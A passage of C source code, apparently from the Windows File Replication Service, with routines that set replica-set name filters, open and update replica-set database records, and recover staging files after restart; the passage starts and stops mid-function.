                                                 FALSE);// do not push acls to children.

    DPRINT1_WS(0, ":S: WARN - FrsRestrictAccessToFileOrDirectory(%ws) (IGNORED)", Replica->Stage, WStatus);

    WStatus = ERROR_SUCCESS;

    REPLICA_STATE_TRACE(3, NULL, Replica, 0, "F,  Init Staging dir: success");



CLEANUP:

    FRS_CLOSE(StageHandle);

    return WStatus;
}


VOID
DbsInitJrnlFilters(
    IN PREPLICA  Replica,
    IN PCONFIG_TABLE_RECORD ConfigRecord
    )
/*++

Routine Description:

    Init the file and dir exclusion and inclusion filters for the replica set.

Arguments:

    Replica   - Replica struct to initialize.
    ConfigRecord -- Ptr to the config record for this replica set.

Return Value:

    None.

--*/
{

#undef DEBSUB
#define DEBSUB "DbsInitJrnlFilters:"

    UNICODE_STRING TempUStr;
    PWCHAR DirFilterList;
    PWCHAR TmpList;

    //
    // File filter list
    //
    FrsFree(Replica->FileFilterList);
    Replica->FileFilterList = FrsWcsDup(ConfigRecord->FileFilterList);
    RtlInitUnicodeString(&TempUStr, ConfigRecord->FileFilterList);

    LOCK_REPLICA(Replica);
    FrsLoadNameFilter(&TempUStr , &Replica->FileNameFilterHead);
    UNLOCK_REPLICA(Replica);

    //
    // File inclusion filter. (Registry only, not avail in DS)
    //
    FrsFree(Replica->FileInclFilterList);
    Replica->FileInclFilterList = FrsWcsDup(RegistryFileInclFilterList);
    RtlInitUnicodeString(&TempUStr, Replica->FileInclFilterList);

    LOCK_REPLICA(Replica);
    FrsLoadNameFilter(&TempUStr, &Replica->FileNameInclFilterHead);
    UNLOCK_REPLICA(Replica);

    //
    // Directory filter list
    //
    FrsFree(Replica->DirFilterList);
    //
    // Add the pre-install dir and the pre-existing to the dir filter list.
    //
    // The usn records are filtered for files in the preinstall directory
    //      Don't assign the munged DirFilterList to the Replica because
    //      the merge code will think the filter list has changed.
    //
    Replica->DirFilterList = FrsWcsDup(ConfigRecord->DirFilterList);
    if (Replica->DirFilterList) {
        DirFilterList = FrsWcsCat3(NTFRS_PREINSTALL_DIRECTORY,
                                   L",",
                                   Replica->DirFilterList);
    } else {
        DirFilterList = FrsWcsDup(NTFRS_PREINSTALL_DIRECTORY);
    }
    TmpList = FrsWcsCat3(NTFRS_PREEXISTING_DIRECTORY, L",", DirFilterList);

    FrsFree(DirFilterList);
    DirFilterList = TmpList;
#if 0
    //
    // This workaround did not solve the DFS dir create problem because the
    // later rename of the dir to the final target name is treated like
    // a movein operation so the dir replicates which was what we were trying
    // to avoid since that led to name morph collisions on other DFS alternates
    // which were doing the same thing.
    //
    TmpList = FrsWcsCat3(NTFRS_REPL_SUPPRESS_PREFIX, L"*,", DirFilterList);
    FrsFree(DirFilterList);
    DirFilterList = TmpList;
#endif

    DPRINT2(0, "++ %ws - New dir filter: %ws\n", Replica->ReplicaName->Name, DirFilterList);

    RtlInitUnicodeString(&TempUStr, DirFilterList);

    LOCK_REPLICA(Replica);
    FrsLoadNameFilter(&TempUStr , &Replica->DirNameFilterHead);
    UNLOCK_REPLICA(Replica);
    DirFilterList = FrsFree(DirFilterList);

    //
    // Dir inclusion filter. (Registry only, Not Avail in DS)
    //
    FrsFree(Replica->DirInclFilterList);
    Replica->DirInclFilterList = FrsWcsDup(RegistryDirInclFilterList);
    RtlInitUnicodeString(&TempUStr, Replica->DirInclFilterList);

    LOCK_REPLICA(Replica);
    FrsLoadNameFilter(&TempUStr, &Replica->DirNameInclFilterHead);
    UNLOCK_REPLICA(Replica);
}



ULONG
DbsOpenReplicaSet (
    IN PTHREAD_CTX  ThreadCtx,
    IN OUT PREPLICA Replica
    )
/*++

Routine Description:

    Open the replica set and initialize the replica struct.
    The ReplicaNumber in the Replica struct is used to identify which
    Replica set to open.

Arguments:

    ThreadCtx - Needed to access Jet.
    Replica   - Replica struct to initialize.

Return Value:

    An FrsError status.  This is also returned in Replica->FStatus.

--*/
{

#undef DEBSUB
#define DEBSUB "DbsOpenReplicaSet:"

    PCONFIG_TABLE_RECORD ConfigRecord = NULL;

    PREPLICA_THREAD_CTX RtCtx;

    JET_ERR jerr = JET_errSuccess, jerr1;
    ULONG FStatus = FrsErrorSuccess, FStatus1;

    DWORD WStatus;
    PCXTION Cxtion;

    DPRINT1(5, "<<<<<<<...E N T E R I N G -- %s...>>>>>>>>\n", DEBSUB);

    //
    // make sure these are null in case we take the error path.
    //
    Replica->Root = FrsFree(Replica->Root);
    Replica->Stage = FrsFree(Replica->Stage);
    Replica->Volume = FrsFree(Replica->Volume);

    //
    // Alloc a Replica Thread Context.
    //
    // Note: The opened tables in a Replica Thread Context can only be
    // used by the thread where they were opened.
    //
    RtCtx = FrsAllocType(REPLICA_THREAD_TYPE);

    //
    // Open the replica tables.
    //
    FStatus = FrsErrorNotFound;
    jerr = DbsOpenReplicaTables(ThreadCtx, Replica, RtCtx);
    CLEANUP_JS(0, "++ ERROR - DbsOpenReplicaTables failed:", jerr, FAULT_RETURN_NO_CLOSE);

    //
    // Setup the replica number and read the config record for this
    // replica into the Replica's config table context.
    // ReadRecord will open the config table for us.
    //
    Replica->ConfigTable.ReplicaNumber = Replica->ReplicaNumber;
    jerr = DbsReadRecord(ThreadCtx,
                         &Replica->ReplicaNumber,
                         ReplicaNumberIndexx,
                         &Replica->ConfigTable);
    CLEANUP_JS(0, "++ ERROR - DbsReadRecord ret:", jerr, FAULT_RETURN_JERR)

    //
    // Get ptr to config record just read for this replica.
    // If the service state was left running then we crashed.  Go to recovery.
    // If the service state was a clean shutdown then go to Init.
    // Otherwise leave state unchanged.
    //
    ConfigRecord = (PCONFIG_TABLE_RECORD) (Replica->ConfigTable.pDataRecord);

    if ((ConfigRecord->ServiceState == CNF_SERVICE_STATE_RUNNING) ||
        (ConfigRecord->ServiceState == CNF_SERVICE_STATE_ERROR)) {
        SET_SERVICE_STATE2(ConfigRecord, CNF_SERVICE_STATE_RECOVERY);
    } else
    if (ConfigRecord->ServiceState == CNF_SERVICE_STATE_CLEAN_SHUTDOWN) {
        SET_SERVICE_STATE2(ConfigRecord, CNF_SERVICE_STATE_INIT);
    }

    //
    //  Init the saved statistics info from the DB.  TBD
    //

    //
    // First, refresh fields that may have stale data.  If we take the error
    // path some of this state is used to post event log messages.
    //

    //
    // Config record flags (CONFIG_FLAG_... in schema.h)
    //
    Replica->CnfFlags = ConfigRecord->CnfFlags;

    Replica->FrsRsoFlags = ConfigRecord->ReplicaSetFlags;

    Replica->Root = FrsWcsDup(ConfigRecord->FSRootPath);
    Replica->Stage = FrsWcsDup(ConfigRecord->FSStagingAreaPath);
    Replica->Volume = FrsWcsVolume(ConfigRecord->FSRootPath);

    FrsFreeGName(Replica->SetName);
    Replica->SetName = FrsBuildGName(FrsDupGuid(&ConfigRecord->ReplicaSetGuid),
                                     FrsWcsDup(ConfigRecord->ReplicaSetName));
    FrsFreeGName(Replica->MemberName);
    Replica->MemberName = FrsBuildGName(FrsDupGuid(&ConfigRecord->ReplicaMemberGuid),
                                        FrsWcsDup(ConfigRecord->ReplicaMemberName));
    FrsFree(Replica->ReplicaRootGuid);
    Replica->ReplicaRootGuid = FrsDupGuid(&ConfigRecord->ReplicaRootGuid);

    //
    // Old databases have a zero originator guid; initialize it
    // to the member guid (default value prior to ReplicaVersionGuid)
    //
    if (IS_GUID_ZERO(&ConfigRecord->ReplicaVersionGuid)) {
        COPY_GUID(&ConfigRecord->ReplicaVersionGuid, &ConfigRecord->ReplicaMemberGuid);
    }
    COPY_GUID(&Replica->ReplicaVersionGuid, &ConfigRecord->ReplicaVersionGuid);

    //
    // If this replica does not have a "name" then assign the name from
    // the config record. We don't want to re-assign an existing name
    // because table entries may point to it.
    //
    if (!Replica->ReplicaName) {
        Replica->ReplicaName = FrsBuildGName(FrsDupGuid(Replica->MemberName->Guid),
                                             FrsWcsDup(Replica->SetName->Name));
    }

#if 0
    // Note: PERF: It would be nice to short circuit most of the init if this
    // replica is tombstoned but can't do this currently since code in
    // replica.c requires some state below, like the connection state, before
    // it will merge state with the DS which it may have to do in the event of
    // reanimation of replica set.  See RcsMergeReplicaCxtions
    //
    // Stop the init at this point if this replica set has been tombstoned.
    // Note that this is not in the right place since some of the init code
    // below should be moved in front of this.
    //
    if (!IS_TIME_ZERO(Replica->MembershipExpires)) {
        Replica->FStatus = FrsErrorReplicaSetTombstoned;
        SET_SERVICE_STATE2(ConfigRecord, CNF_SERVICE_STATE_TOMBSTONE);
        return FrsErrorReplicaSetTombstoned;
    }
#endif

    //
    // Init the File and Dir Exclusion and Inclusion filters for this replica set.
    //
    DbsInitJrnlFilters(Replica, ConfigRecord);

    //
    // Allocate a hash table to record file name dependencies between change
    // orders.  This is used to enforce a name space sequencing constraint
    // when a change order is issued.  If we get a delete filex followed by a
    // create filex then we better do those in order.  Ditto for rename a to b
    // followed by rename b to c.  The hash function is on the name and parent
    // dir object ID.
    //
    Replica->NameConflictTable = FrsFreeType(Replica->NameConflictTable);
    Replica->NameConflictTable = FrsAllocTypeSize(QHASH_TABLE_TYPE,
                                                  REPLICA_NAME_CONFLICT_TABLE_SIZE);
    SET_QHASH_TABLE_HASH_CALC(Replica->NameConflictTable,
                              DbsReplicaNameConflictHashCalc);

    //
    // Allocate an INLOG Active Retry hash Table for the volume.
    // It tracks which retry change orders are currently active so we don't
    // reissue the same change order until current invocation completes.
    //
    Replica->ActiveInlogRetryTable = FrsAllocTypeSize(
                                         QHASH_TABLE_TYPE,
                                         REPLICA_ACTIVE_INLOG_RETRY_SIZE);
    SET_QHASH_TABLE_HASH_CALC(Replica->ActiveInlogRetryTable,
                              DbsReplicaHashCalcCoSeqNum);

    //
    // Copy the ConfigRecord's blob into the Replica
    //
    DbsUnPackFromConfigRecordBlobs(Replica, &Replica->ConfigTable);

    //
    // Membership tombstone
    //
    COPY_TIME(&Replica->MembershipExpires, &ConfigRecord->MembershipExpires);

    //
    // Replica set type
    //
    Replica->ReplicaSetType = ConfigRecord->ReplicaSetType;

    //
    // Open the preinstall directory and hold it open until the
    // replica is closed. Create if necessary. The attributes for
    // the preinstall directory are system, hidden, and readonly.
    //
    FRS_CLOSE(Replica->PreInstallHandle);
    Replica->PreInstallFid = ZERO_FID;

    WStatus = DbsCreatePreInstallDir(Replica);
    FStatus = Replica->FStatus;
    CLEANUP_WS(0, "Error: can't open pre-install dir", WStatus, FAULT_RETURN);

    //
    // Open the staging dir, set the attributes and put an ACL on it.
    //
    WStatus = DbsOpenStagingDir(Replica);
    FStatus = Replica->FStatus;
    CLEANUP_WS(0, "Error: can't open stage dir", WStatus, FAULT_RETURN);

    //
    // Enumerate the version vector
    //
    DPRINT1(5, "++ LOADING VERSION VECTOR FOR %ws\n", Replica->ReplicaName->Name);
    VVFree(Replica->VVector);
    Replica->VVector = GTabAllocTable();
    VVFree(Replica->OutlogVVector);
    Replica->OutlogVVector = GTabAllocTable();
    jerr = FrsEnumerateTable(ThreadCtx,
                             &RtCtx->VVTable,
                             VVOriginatorGuidIndexx,
                             DbsBuildVVTableWorker,
                             Replica);
    if ((jerr != JET_errNoCurrentRecord) && (jerr != JET_wrnTableEmpty)) {
        CLEANUP_JS(0, "++ ERROR Enumerating version vector", jerr, FAULT_RETURN_JERR);
    }

    VV_PRINT(4, Replica->ReplicaName->Name,  Replica->VVector);
    //
    // Enumerate the cxtions
    //
    DPRINT1(5, "++ LOADING CXTIONS FOR %ws\n", Replica->ReplicaName->Name);
    GTabFreeTable(Replica->Cxtions, FrsFreeType);
    Replica->Cxtions = GTabAllocTable();
    //
    // The replica structure has a field called JrnlCxtionGuid
    // which contains the GUID for the journal's (virtual) connection
    // This is used to store (and index) the connection structure
    // for the journal's connection in the Replica's connection's
    // table. The GUID is assigned just before allocating the
    // connection structure
    //
    FrsUuidCreate(&(Replica->JrnlCxtionGuid));
    //
    // Allocate the connection structure for the Journal's connection
    //
    Cxtion = FrsAllocType(CXTION_TYPE);
    //
    // Set the fields of the allocated structure
    // Set the Name, Partner, PartSrvName, PartnerPrincName fields
    // to the value <Jrnl Cxtion>
    // No authentication needed
    // Its an Inbound connection
    // This is a (virtual) Journal connection
    //
    Cxtion->Name = FrsBuildGName(FrsDupGuid(&(Replica->JrnlCxtionGuid)),
                                 FrsWcsDup(L"<Jrnl Cxtion>"));
    Cxtion->Partner = FrsBuildGName(FrsDupGuid(&(Replica->JrnlCxtionGuid)),
                                    FrsWcsDup(L"<Jrnl Cxtion>"));
    Cxtion->PartSrvName = FrsWcsDup(L"<Jrnl Cxtion>");
    Cxtion->PartnerPrincName = FrsWcsDup(L"<Jrnl Cxtion>");
    Cxtion->PartnerDnsName = FrsWcsDup(L"<Jrnl Cxtion>");
    Cxtion->PartnerSid = FrsWcsDup(L"<Jrnl Cxtion>");
    Cxtion->PartnerAuthLevel = CXTION_AUTH_NONE;
    Cxtion->Inbound = TRUE;
    Cxtion->JrnlCxtion = TRUE;
    //
    // Start the journal connection out as Joined and give it a JOIN guid.
    //
    DPRINT1(0, "***** JOINED    "FORMAT_CXTION_PATH2"\n",
            PRINT_CXTION_PATH2(Replica, Cxtion));
    SetCxtionState(Cxtion, CxtionStateJoined);
    FrsCreateJoinGuid(&Cxtion->JoinGuid);
    SetCxtionFlag(Cxtion, CXTION_FLAGS_JOIN_GUID_VALID |
                          CXTION_FLAGS_UNJOIN_GUID_VALID);

    //
    // Insert the connection into the connection's table of the
    // Replica Set. This entry in the table is indexed by the
    // JrnlCxtionGuid of the Replica structure
    //
    GTabInsertEntry(Replica->Cxtions, Cxtion, Cxtion->Name->Guid, NULL);

    //
    // Print the connection structure just allocated
    //
    DPRINT1(1, ":X: The Jrnl Cxtion "FORMAT_CXTION_PATH2"\n",
            PRINT_CXTION_PATH2(Replica, Cxtion));

    jerr = FrsEnumerateTable(ThreadCtx,
                             &RtCtx->CXTIONTable,
                             CrCxtionGuidxIndexx,
                             DbsBuildCxtionTableWorker,
                             Replica);
    if ((jerr != JET_errNoCurrentRecord) && (jerr != JET_wrnTableEmpty)) {
        CLEANUP_JS(0, "++ ERROR Enumerating cxtions:", jerr, FAULT_RETURN_JERR);
    }

    //
    // Enumerate the change orders in the inbound log.
    //
    DPRINT1(4, ":S: SCANNING INLOG FOR %ws\n", Replica->ReplicaName->Name);
    Replica->JrnlRecoveryStart = (USN)0;
    jerr = FrsEnumerateTable(ThreadCtx,
                             &RtCtx->INLOGTable,
                             ILSequenceNumberIndexx,
                             DbsInlogScanWorker,
                             Replica);
    if ((jerr != JET_errNoCurrentRecord) && (jerr != JET_wrnTableEmpty)) {
        CLEANUP_JS(0, "++ ERROR Enumerating INLOG table:", jerr, FAULT_RETURN_JERR);
    }

    DPRINT1(4, "++ JrnlRecoveryStart: %08x %08x \n",
            PRINTQUAD(Replica->JrnlRecoveryStart));
    DPRINT1(4, "++ InLogRetryCount: %d\n", Replica->InLogRetryCount);

    //
    // Start the outbound log processor for this Replica.  Can't use
    // OutLogSubmit() for this call because the OutLog processor must have all
    // the connections known before it starts so when it trims the log it can
    // correctly compute the Joint trailing index.  Also can't use
    // OutLogSubmit() for this call because this call can be made during
    // startup and the OutLogSubmit() waits for the Database to init so
    // a synchronous submit call would hang.
    //
    FStatus = OutLogAddReplica(ThreadCtx, Replica);
    CLEANUP_FS(0, ":S: ERROR - return from OutLogAddReplica", FStatus, FAULT_RETURN_2);

    //
    // This replica is open.  Link the Replica Thread Ctx to it.
    //
    Replica->FStatus = FrsErrorSuccess;
    FrsRtlInsertTailList(&Replica->ReplicaCtxListHead, &RtCtx->ReplicaCtxList);

    return FrsErrorSuccess;


FAULT_RETURN_JERR:
    FStatus = DbsTranslateJetError(jerr, FALSE);

FAULT_RETURN:
    //
    // This replica set is going into the error state.  Close our handle
    // on the pre-install dir so as not to interfere with another replica set
    // that may use the same root.  The presumption is that this faulty
    // replica set is going to get deleted anyway, but that may not have happened
    // yet.
    //
    if (HANDLE_IS_VALID(Replica->PreInstallHandle)) {
        FRS_CLOSE(Replica->PreInstallHandle);
        Replica->PreInstallFid = ZERO_FID;
    }

    //
    // Shut down the outbound log processor for this replica.  Can't use
    // OutLogSubmit() for this call because this call can be made during
    // startup and the OutLogSubmit() waits for the Database to init so
    // a synchronous submit call would hang.
    //
    FStatus1 = OutLogRemoveReplica(ThreadCtx, Replica);
    DPRINT_FS(0, ":S: OutLogRemoveReplica error:", FStatus1);

FAULT_RETURN_2:
    //
    // Close the tables
    //
    jerr1 = DbsCloseReplicaTables(ThreadCtx, Replica, RtCtx, TRUE);
    DPRINT_JS(0, "++ DbsCloseReplicaTables close error:", jerr1);


FAULT_RETURN_NO_CLOSE:
    //
    // Save the status and free the Replica Thread context.
    // At this point FStatus is valid, ConfigRecord may not be valid.
    //
    RtCtx = FrsFreeType(RtCtx);

    Replica->FStatus = FStatus;

    if (ConfigRecord != NULL) {
        SET_SERVICE_STATE2(ConfigRecord, CNF_SERVICE_STATE_ERROR);
    }

    return FStatus;
}



ULONG
DbsUpdateReplica(
    IN PTHREAD_CTX  ThreadCtx,
    IN PREPLICA     Replica
    )
/*++

Routine Description:

    Update the replica set. The ReplicaNumber in the Replica
    struct is used to identify the Replica.

Arguments:

    ThreadCtx - Needed to access Jet.
    Replica   - Replica struct to update

Thread Return Value:

    An FrsError status.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsUpdateReplica:"
    ULONG                   FStatus;
    DWORD                   MemberSize;
    PCHAR                   MemberName;
    DWORD                   FilterSize;
    PCHAR                   Filter;
    PTABLE_CTX              TableCtx = &Replica->ConfigTable;
    PCONFIG_TABLE_RECORD    ConfigRecord = TableCtx->pDataRecord;

    DPRINT1(5, "<<<<<<<...E N T E R I N G -- %s...>>>>>>>>\n", DEBSUB);

    //
    // CONFIG RECORD
    //

    //
    // Config record flags (CONFIG_FLAG_... in schema.h)
    //
    ConfigRecord->CnfFlags = Replica->CnfFlags;

    //
    // FRS Replica Set Object Flags.
    //
    ConfigRecord->ReplicaSetFlags = Replica->FrsRsoFlags;

    //
    // Root Guid
    //
    COPY_GUID(&ConfigRecord->ReplicaRootGuid, Replica->ReplicaRootGuid);

    //
    // Tombstone
    //
    COPY_TIME(&ConfigRecord->MembershipExpires, &Replica->MembershipExpires);

    //
    // Shouldn't change
    //
    ConfigRecord->ReplicaSetType = Replica->ReplicaSetType;

    //
    // Set Guid
    //
    COPY_GUID(&ConfigRecord->ReplicaSetGuid, Replica->SetName->Guid);

    //
    // Set Name
    //
    wcsncpy(ConfigRecord->ReplicaSetName, Replica->SetName->Name, DNS_MAX_NAME_LENGTH + 1);
    ConfigRecord->ReplicaSetName[DNS_MAX_NAME_LENGTH] = L'\0';

    //
    // Member Guid
    // Replication to two different directories on the same computer
    // is allowed. Hence, a replica set will have multiple configrecords
    // in the DB, one for each "member". The member guid is used for
    // uniqueness.
    //
    COPY_GUID(&ConfigRecord->ReplicaMemberGuid, Replica->MemberName->Guid);

    //
    // Member Name
    //
    MemberSize = (wcslen(Replica->MemberName->Name) + 1) * sizeof(WCHAR);
    FStatus = DBS_REALLOC_FIELD(TableCtx, ReplicaMemberNamex, MemberSize, FALSE);
    if (!FRS_SUCCESS(FStatus)) {
        DPRINT_FS(0, "++ ERROR - reallocating member name;", FStatus);
        Replica->FStatus = FStatus;
    } else {
        MemberName = DBS_GET_FIELD_ADDRESS(TableCtx, ReplicaMemberNamex);
        CopyMemory(MemberName, Replica->MemberName->Name, MemberSize);
    }

    //
    // Schedule, version vector, ...
    //
    FStatus = DbsPackIntoConfigRecordBlobs(Replica, TableCtx);
    if (!FRS_SUCCESS(FStatus)) {
        DPRINT_FS(0, "++ ERROR - packing config blobs;", FStatus);
        Replica->FStatus = FStatus;
    }

    //
    // File filter
    //
    // Note: For now the inclusion filter is registry only and is not saved in the config record.
    //
    if (!Replica->FileFilterList) {
        Replica->FileFilterList =  FRS_DS_COMPOSE_FILTER_LIST(
                                       NULL,
                                       RegistryFileExclFilterList,
                                       DEFAULT_FILE_FILTER_LIST);
    }
    FilterSize = (wcslen(Replica->FileFilterList) + 1) * sizeof(WCHAR);
    FStatus = DBS_REALLOC_FIELD(TableCtx, FileFilterListx, FilterSize, FALSE);
    if (!FRS_SUCCESS(FStatus)) {
        DPRINT_FS(0, "++ ERROR - reallocating file filter;", FStatus);
        Replica->FStatus = FStatus;
    } else {
        Filter = DBS_GET_FIELD_ADDRESS(TableCtx, FileFilterListx);
        CopyMemory(Filter, Replica->FileFilterList, FilterSize);
    }

    //
    // Directory filter
    //
    // For now the inclusion filter is registry only and is not saved in the config record.
    //
    if (!Replica->DirFilterList) {
        Replica->DirFilterList =  FRS_DS_COMPOSE_FILTER_LIST(
                                      NULL,
                                      RegistryDirExclFilterList,
                                      DEFAULT_DIR_FILTER_LIST);
    }
    FilterSize = (wcslen(Replica->DirFilterList) + 1) * sizeof(WCHAR);
    FStatus = DBS_REALLOC_FIELD(TableCtx, DirFilterListx, FilterSize, FALSE);
    if (!FRS_SUCCESS(FStatus)) {
        DPRINT_FS(0, "++ ERROR - reallocating dir filter", FStatus);
        Replica->FStatus = FStatus;
    } else {
        Filter = DBS_GET_FIELD_ADDRESS(TableCtx, DirFilterListx);
        CopyMemory(Filter, Replica->DirFilterList, FilterSize);
    }

    //
    // Update the staging path.
    //
    if (Replica->NewStage != NULL) {
        wcsncpy(ConfigRecord->FSStagingAreaPath, Replica->NewStage, MAX_PATH + 1);
        ConfigRecord->FSStagingAreaPath[MAX_PATH] = L'\0';
    }

    //
    // Update Timestamp
    //
    GetSystemTimeAsFileTime(&ConfigRecord->LastDSChangeAccepted);

    //
    // UPDATE IFF NO OUTSTANDING ERRORS
    //
    if (FRS_SUCCESS(Replica->FStatus)) {
        Replica->FStatus = DbsUpdateConfigTable(ThreadCtx, Replica);
    }
    return Replica->FStatus;
}


JET_ERR
DbsRecoverStagingAreasOutLog (
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
)
/*++

Routine Description:

    This is a worker function passed to FrsEnumerateTable().  Each time
    it is called it processes a record from the Outbound log table.

    It scans the Outbound log table and rebuilds the inmemory staging
    file table.

Arguments:

    ThreadCtx - Needed to access Jet.
    TableCtx  - A ptr to an outbound log context struct.
    Record    - A ptr to a change order command record.
    Context   - A ptr to the Replica struct we are working on.

Thread Return Value:

    JET_errSuccess if enum is to continue.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsRecoverStagingAreasOutlog:"

    ULONG                   Flags;
    DWORD                   WStatus;
    CHAR                    GuidStr[GUID_CHAR_LEN];
    PREPLICA                Replica = (PREPLICA) Context;
    PCHANGE_ORDER_COMMAND   CoCmd   = (PCHANGE_ORDER_COMMAND)Record;

    DBS_DISPLAY_RECORD_SEV(5, TableCtx, TRUE);

    //
    // Abort enum if shutting down.
    //
    if (FrsIsShuttingDown) {
        return JET_errTermInProgress;
    }

    //
    // Update the Replica->
    //
    if (CoCmd->SequenceNumber < Replica->OutLogCOMin) {
        Replica->OutLogCOMin = CoCmd->SequenceNumber;
        DPRINT1(4, "OutLogCOMin = 0x%08x\n", Replica->OutLogCOMin);
    }

    //
    // Ignore if no staging file
    //
    GuidToStr(&CoCmd->ChangeOrderGuid, GuidStr);
    DPRINT2(4, ":S: Outlog recovery of %ws %s\n", CoCmd->FileName, GuidStr);
    if (!FrsDoesCoNeedStage(CoCmd)) {
        DPRINT2(4, "++ No OutLog stage recovery for %ws (%s)\n", CoCmd->FileName, GuidStr);
        return JET_errSuccess;
    }

    //
    // Put an entry in the staging area table.
    // STAGE_FLAG_STAGE_MANAGEMENT ensures that we do not update
    // last access time when we acquire staging entry.
    //
    Flags = STAGE_FLAG_RESERVE |
            STAGE_FLAG_EXCLUSIVE |
            STAGE_FLAG_FORCERESERVE |
            STAGE_FLAG_RECOVERING |
            STAGE_FLAG_STAGE_MANAGEMENT;

    WStatus = StageAcquire(&CoCmd->ChangeOrderGuid,
                           CoCmd->FileName,
                           CoCmd->FileSize,
                           &Flags,
                           Replica->ReplicaNumber,
                           NULL);

    if (!WIN_SUCCESS(WStatus)) {
        DPRINT2_WS(4, "++ ERROR - No OutLog stage recovery for %ws (%s)",
                   CoCmd->FileName, GuidStr, WStatus);
        return JET_wrnNyi;
    }

    //
    // Release our hold on the staging area entry
    //

    Flags = STAGE_FLAG_RECOVERING;

    //
    // Set the installed flag on the entry if it has been installed so it is
    // eligible for replacement. Used in StageCsFreeStaging()
    //
    if (!BooleanFlagOn(CoCmd->Flags, CO_FLAG_INSTALL_INCOMPLETE)) {
        Flags = Flags | STAGE_FLAG_INSTALLED;
    }

    StageRelease(&CoCmd->ChangeOrderGuid, CoCmd->FileName, Flags, NULL, NULL, NULL);

    return JET_errSuccess;
}


JET_ERR
DbsRecoverStagingAreasInLog (
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
)
/*++

Routine Description:

    This is a worker function passed to FrsEnumerateTable().  Each time
    it is called it processes a record from the Inbound log table.

    It scans the inbound log table and rebuilds the inmemory staging
    file table.

Arguments:

    ThreadCtx - Needed to access Jet.
    TableCtx  - A ptr to an inbound log context struct.
    Record    - A ptr to a change order command record.
    Context   - A ptr to the Replica struct we are working on.

Thread Return Value:

    JET_errSuccess if enum is to continue.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsRecoverStagingAreasInlog:"

    ULONG                   Flags;
    DWORD                   WStatus;
    CHAR                    GuidStr[GUID_CHAR_LEN];
    PREPLICA                Replica = (PREPLICA) Context;
    PCHANGE_ORDER_COMMAND   CoCmd   = (PCHANGE_ORDER_COMMAND)Record;
    GUID                   *CoGuid;

    DBS_DISPLAY_RECORD_SEV(5, TableCtx, TRUE);

    //
    // Abort enum if shutting down.
    //
    if (FrsIsShuttingDown) {
        return JET_errTermInProgress;
    }

    CoGuid = &CoCmd->ChangeOrderGuid;
    //
    // Ignore if no staging file
    //
    GuidToStr(CoGuid, GuidStr);
    DPRINT2(4, ":S: Inlog recovery of %ws %s\n", CoCmd->FileName, GuidStr);
    if (!FrsDoesCoNeedStage(CoCmd)) {
        DPRINT2(4, "++ No InLog stage recovery for %ws (%s)\n",
                CoCmd->FileName, GuidStr);
        return JET_errSuccess;
    }

    //
    // Put an entry in the staging area table
    // STAGE_FLAG_STAGE_MANAGEMENT ensures that we do not update
    // last access time when we acquire staging entry.
    //
    Flags = STAGE_FLAG_RESERVE |
            STAGE_FLAG_EXCLUSIVE |
            STAGE_FLAG_FORCERESERVE |
            STAGE_FLAG_RECOVERING |
            STAGE_FLAG_STAGE_MANAGEMENT;

    WStatus = StageAcquire(CoGuid, CoCmd->FileName, CoCmd->FileSize, &Flags, Replica->ReplicaNumber, NULL);

    if (!WIN_SUCCESS(WStatus)) {
        DPRINT2_WS(4, "++ ERROR - No InLog stage recovery for %ws (%s):",
                   CoCmd->FileName, GuidStr, WStatus);
        return JET_wrnNyi;
    }

    //
    // Release our hold on the staging area entry
    //
    StageRelease(CoGuid, CoCmd->FileName, STAGE_FLAG_RECOVERING, NULL, NULL, NULL);

    return JET_errSuccess;
}


DWORD
DbsRecoverStagingFiles (
    IN PREPLICA Replica,
    IN DWORD    GenLen,
    IN DWORD    GenPrefixLen,
    IN DWORD    GenCompressedLen,
    IN DWORD    GenCompressedPrefixLen,
    IN DWORD    FinalLen,
    IN DWORD    FinalPrefixLen,
    IN DWORD    FinalCompressedLen,
    IN DWORD    FinalCompressedPrefixLen
)
/*++

Routine Description:

    Recover the staging files in the staging area of Replica.

Arguments:

    Replica
    GenLen          - Length of staging file name being generated
    GenPrefixLen    - Length of prefix of staging file being generated
    FinalLen        - Length of generated staging file name
    FinalPrefixLen  - Length of generated staging file name prefix

Thread Return Value:

    Win32 Status

--*/
{
#undef DEBSUB
#define DEBSUB "DbsRecoverStagingFiles:"

    WIN32_FIND_DATA FindData;
    GUID            Guid;
    DWORD           FileNameLen;
    DWORD           Flags;
    HANDLE          SearchHandle = INVALID_HANDLE_VALUE;
    PWCHAR          StagePath = NULL;
    BOOL            ResetDirectory = FALSE;
    WCHAR           CurrentDirectory[MAX_PATH + 1];
    DWORD           WStatus = ERROR_SUCCESS;
    CHAR            TimeString[TIME_STRING_LENGTH];


    LARGE_INTEGER SizeOfFileGenerated;
    SizeOfFileGenerated.HighPart = 0;
    SizeOfFileGenerated.LowPart = 0;

    CurrentDirectory[0] = L'\0';
    DPRINT2(4, ":S: Recovering %ws for %ws\n", Replica->Stage, Replica->ReplicaName->Name);

    //
    // Get our current directory
    //
    if (!GetCurrentDirectory(MAX_PATH, CurrentDirectory)) {
        WStatus = GetLastError();
        DPRINT1_WS(0, "++ ERROR - GetCurrentDirectory(%ws);", Replica->Stage, WStatus);
        goto cleanup;
    }

    //
    // Change directories (for relative file deletes below)
    //
    if (!SetCurrentDirectory(Replica->Stage)) {
        WStatus = GetLastError();
        DPRINT1_WS(0, "++ ERROR - SetCurrentDirectory(%ws);", Replica->Stage, WStatus);
        goto cleanup;
    }
    ResetDirectory = TRUE;

    //
    // Okay to branch to cleanup from here on
    //

    //
    // Open the staging area
    //
    StagePath = FrsWcsPath(Replica->Stage, L"*.*");
    SearchHandle = FindFirstFile(StagePath, &FindData);

    if (!HANDLE_IS_VALID(SearchHandle)) {
        WStatus = GetLastError();
        DPRINT1_WS(0, "++ ERROR - FindFirstFile(%ws);", StagePath, WStatus);
        goto cleanup;
    }

    do {

        if (FrsIsShuttingDown) {
            WStatus = ERROR_PROCESS_ABORTED;
            goto cleanup;
        }

        DPRINT1(4, "++ Recover staging file %ws\n", FindData.cFileName);
        if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            DPRINT1(4, "++ %ws is a directory; skipping\n", FindData.cFileName);
            continue;
        }

